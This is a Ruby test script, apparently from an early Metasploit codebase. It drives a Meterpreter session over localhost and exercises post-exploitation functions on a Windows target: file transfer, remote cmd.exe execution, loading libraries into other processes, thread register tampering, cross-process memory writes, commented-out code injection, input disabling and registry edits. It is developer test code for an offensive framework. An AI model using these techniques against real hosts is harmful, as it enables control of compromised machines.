#!/usr/bin/ruby -I../../lib

require 'Rex/Post'

netconf  = false
ui       = false
net      = false
fseek    = false
dir      = true
process  = false
registry = false
copy     = false

sock   = TCPSocket.new('127.0.0.1', 12345)
client = Rex::Post::Meterpreter::Client.new(sock)

client.core.use(
	'Module' => 'Stdapi')

puts "Client interface:"
client.dump_extension_tree.each { |x|
	puts "\t#{x}"
}
puts "\n\n"

if (net)
	s = client.net.create_channel(
			'PeerHost' => '128.242.160.3',
			'PeerPort' => '80',
			'Proto'    => 'tcp')

	puts "writing 'GET / HTTP/1.0'..."
	s.write("GET / HTTP/1.0\r\n\r\n")
	puts "reading in 20 bytes from the socket:\n#{s.read(20)}"

	s.close
end

if (copy)

	puts "Uploading...\n"
	client.fs.file.upload("c:\\personal\\temp\\mirror", "/bin/cat", "/tmp/dog")

	puts "Downloading...\n"
	client.fs.file.download("/tmp/test", "c:\\personal\\temp\\ati3duag.dll", 
			"c:\\personal\\temp\\blah.asm", "c:\\personal\\temp\\boa.tar.gz")

end

if (netconf)

	puts "Routes:\n\n"
	client.net.config.each_route { |route|
		puts route.pretty
	}

	puts "\n\nInterfaces:\n\n"

	client.net.config.each_interface { |interface|
		puts interface.pretty
	}

	client.net.config.add_route('1.2.3.4', '255.255.255.255', '127.0.0.1')
	puts "after adding 1.2.3.4 route\n\n"
	client.net.config.each_route { |route|
		puts route.pretty
	}
	client.net.config.remove_route('1.2.3.4', '255.255.255.255', '127.0.0.1')
	puts "after removing 1.2.3.4 route\n\n"
	client.net.config.each_route { |route|
		puts route.pretty
	}

end

if (ui)
	input = false

	puts "idle time: #{client.ui.idle_time}"

	sleep 60

	puts "idle time: #{client.ui.idle_time}"

	if (input)
		puts "disabling"
  #	client.ui.disable_keyboard
		client.ui.disable_mouse

		sleep 60

		puts "enabling"
  #	client.ui.enable_keyboard
		client.ui.enable_mouse
		puts "done"
	end
end

if (fseek)
	f = client.fs.file.new("c:\\personal\\temp\\hm.c")

	puts "current position: #{f.tell}"
	puts "some text:\n#{f.read}"
	puts "current position: #{f.tell}"
	f.seek(0, IO::SEEK_SET)
	puts "current position: #{f.tell}"
	puts "some text again:\n#{f.read}"
	f.seek(40, IO::SEEK_SET)
	puts "eof? #{f.eof}"
	puts "current position: #{f.tell}"
	puts "some text again:\n#{f.read}"
	begin
		puts "some text again:\n#{f.read}"
		puts "some text again:\n#{f.read}"
	rescue EOFError
		puts "got eof"
	rescue
		puts "got other"
	end
	puts "eof? #{f.eof}"

end

if (dir)
	puts "Testing dir...\n\n"

	puts "%WINDIR% is #{client.fs.file.expand_path('%WINDIR%')}"

	puts "Getting contents of C:\\"

	client.fs.dir.foreach("C:\\") { |name|
		puts "\t#{name}\n"
	}

	puts "working directory: #{client.fs.dir.pwd}"
	client.fs.dir.chdir("..")
	puts "working directory: #{client.fs.dir.getwd}"
	client.fs.dir.chdir("c:\\windows")
	puts "working directory: #{client.fs.dir.pwd}"
	client.fs.dir.mkdir("c:\\personal\\temp\\tester")
	client.fs.dir.unlink("c:\\personal\\temp\\tester")

	s = client.fs.filestat.new("C:\\Windows\\notepad.exe")

	puts s.pretty

	puts client.fs.file.stat("C:\\windows\\notepad.exe").mtime

	# open a file and read in some text
	f = client.fs.file.new("C:\\personal\\temp\\hm.c")

	puts "some text:\n #{f.read}"

	f.close
end

if (process)
	puts "Testing process...\n\n"

	puts "exploited pid is #{client.sys.process.getpid}"
	puts "exploited name is #{client.sys.process.open.name}"
	puts "exploited path is #{client.sys.process.open.path}"

	##
	#
	# enumeration testing
	#
	##
	debug_pid = client.sys.process['calc.exe']

	puts "pid of calc.exe is #{debug_pid}"

	#client.sys.process.kill(debug_pid)

	##
	#
	# Load a library in another process
	#
	##

	p = client.sys.process.open(debug_pid)
	base = p.image.load('zipfldr.dll')

	printf "loaded zipfldr.dll into #{p.pid} at %.8x\n", base
	
	addr = p.image.get_procedure_address('zipfldr.dll', 'RouteTheCall')

	printf "addr of RouteTheCall is: %.8x\n", addr

	p.image.unload(base)

	puts "unloaded it"

	##
	#
	# Execution
	#
	##
	
	p = client.sys.process.execute("cmd.exe", nil, 
			{
				'Channelized' => true
			})

	d = p.io.read

	puts "read from cmd.exe:\n#{d}"

	p.io.write("dir\n")

	d = p.io.read

	puts "read from cmd.exe:\n#{d}"

	##
	#
	# threads
	#
	##
	p = client.sys.process.open(debug_pid)

	p.thread.each_thread { |id|
		puts "thread id: #{id}"

		thread = p.thread.open(id)

		puts "suspending..."
		thread.suspend
		puts "registers:\n"
		puts thread.pretty_regs
		thread.set_regs(
			'eax' => 0x41414141,
			'ebx' => 0xdeadbeef)
		puts thread.pretty_regs
		puts "resuming..."
		thread.resume
		puts "closing..."
		thread.close
	}

	##
	#
	# code injection
	#
	##
	
	#buf = p.memory.allocate(400)
	#p.memory.write(buf, "\xcc")
	#p.thread.create(buf)
	#p.close
	##
	#
	# image testing
	#
	##
	
	exp = client.sys.process.open

	addr = exp.image.load('wininet.dll')
	printf "wininet.dll is loaded at: %.8x\n", addr

	exp.image.unload(addr)

	printf "LoadLibraryA is at: %.8x\n", exp.image.get_procedure_address('kernel32.dll', 'LoadLibraryA')

	printf "ntdll.dll base is at: %.8x\n", exp.image['ntdll.dll']

	##
	#
	# memory testing
	#
	##

	p = client.sys.process.open(debug_pid, PROCESS_ALL)

	addr = p.memory.allocate(400, PROT_WRITE | PROT_READ)

	printf "allocated memory at %.8x\n", addr

	p.memory.write(addr, 'this is a test yo')

	data = p.memory.read(addr, 10)

	printf "read memory from %.8x (#{data.length}): #{data.to_s}\n", addr

	info = p.memory.query(addr)

	printf "addr: %.8x (size=%d, prot=%.8x)\n", addr, info['RegionSize'], info['Protect']

	if (p.memory.writable?(addr))
		puts "memory is writable like it should be\n"
	end

	p.memory.protect(addr, info['RegionSize'], PROT_READ)

	if (!p.memory.writable?(addr))
		puts "memory is NOT writable like it should be\n"
	else
		puts "memory is writable but it should not be\n"
	end

	begin
		p.memory.write(addr, 'test again')
	rescue
		puts "caught exception like expected during write #{$!}"
	end

	p.close

	# attach to the exploited process
	exp = client.sys.process.open

	addr = exp.memory.allocate(400, PROT_WRITE)

	exp.memory.lock(addr, 4096)
	exp.memory.unlock(addr, 4096)

	exp.close

end

if (registry)
	puts "Testing registry...\n\n"

	regkey = client.sys.registry.open_key(HKEY_CURRENT_USER,
			'Software', KEY_ALL_ACCESS)

	puts "hkey is #{regkey.hkey}"

	regkey.set_value('test123', REG_SZ, 'yo what up')
	regkey.set_value('testdword', REG_DWORD, '666')

	val = regkey.query_value('test123')
	val2 = regkey.query_value('testdword')
	
	puts "value name: #{val.name} type: #{val.type} data: '#{val.data}'"
	puts "value name: #{val2.name} type: #{val2.type} data: '#{val2.data}'"

	val.set('ho ho ho')
	val.delete

	regkey.enum_key.each { |key|
		puts "child key: #{key}"
	}

	regkey.enum_value.each { |value|
		puts "child value: #{value.name}"
	}

	k = regkey.create_key('TestKey')
	k.close
	regkey.delete_key('TestKey')
	
	regkey.close
end

while (true)
	printf("sup\n")

	select nil, nil, nil, 4
end
